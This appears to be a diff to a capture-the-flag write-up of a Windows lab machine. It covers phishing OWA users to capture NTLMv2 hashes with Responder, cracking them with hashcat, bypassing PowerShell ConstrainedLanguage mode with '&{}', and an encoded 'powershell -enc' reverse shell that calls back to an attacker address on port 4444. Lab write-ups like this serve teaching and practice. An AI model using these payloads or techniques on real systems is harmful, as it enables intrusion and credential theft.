@@ -53,10 +53,25 @@ Examples of tools: <a href="https://github.com/sensepost/ruler">Ruler</a>, <a hr
 After some time we have a valid credentials: <span style="color:red">s.svensson:Summer2020</span>
 
 
-We login with s.svensson account, and we can see that we have a list of users in owa adress book, an evident tought that come to our mind is to send a phishing email to all users, with an email body set to out attacker machine. 
+We login with s.svensson account, and we can see that we have a list of users in the owa adress book, an evident tought that come to our mind is to send a phishing email to all users, with an email body set to out attacker machine. 
 
 
 We set our responder as follow: <span style="color:blue"><emb>responder -I tun0 -v</emb></span>
 
 
-A few seconds later we got NTLMv2 hash for a k.svensson, and we launch hashcat to crack that hash.
+A few seconds later we got NTLMv2 hash for a k.svensson, and we launch hashcat to crack that hash: <span style="color:red">k.svensson:kittycat1</span>
+
+
+At this stage we will try to use this crendentials to execute powershell remoting, we had a problem of ConstrainedLanguage mode in that powershell session. To bypass this restriction we can create a function and call it, or we use the & sign to execute commands. So the following will execute whoami command: 
+
+
+<span style="color:blue"><emb>Invoke-Command -ComputerName 10.10.10.210 -Credential 'HTB.local\k.svensson' -Authentication Negotiate -ScriptBlock {&{whoami}}</emb></span>
+```
+PowerShell credential request
+Enter your credentials.                                                                                                                                                          
+Password for user HTB.local\k.svensson: *********
+
+htb\k.svensson
+```
+
+<span style="color:blue"><emb>Invoke-Command -ComputerName 10.10.10.210 -Credential 'HTB.local\k.svensson' -Authentication Negotiate -ScriptBlock {&{powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA0AC4AMgA0ADcAJwAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAJwBQAFMAIAAnACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAJwA+ACAAJwA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQAKAAoA}}</emb></span>
